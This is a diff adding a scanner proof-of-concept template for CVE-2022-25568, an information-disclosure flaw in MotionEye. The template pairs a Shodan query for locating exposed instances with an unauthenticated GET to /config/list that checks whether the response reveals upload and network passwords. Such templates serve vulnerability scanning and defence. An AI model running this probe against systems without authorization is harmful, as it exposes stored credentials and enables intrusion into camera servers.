@@ -1,0 +1,16 @@
+id: poc-yaml-motioneye-config-info-disclosure
+info:
+  name: MotionEye Config-list 信息泄露漏洞(CVE-2022-25568)
+  severity: high
+  tags:
+  - CVE-2022-25568
+  - 信息泄露
+  finger: motioneye
+  shodan: html:"MotionEye"
+requests:
+- method: GET
+  path: /config/list
+  expression: status_code == 200 && contains(body,"upload_password") && contains(body,"network_password")
+    && contains(headers,"application/json")
+variables: {}
+transport: http
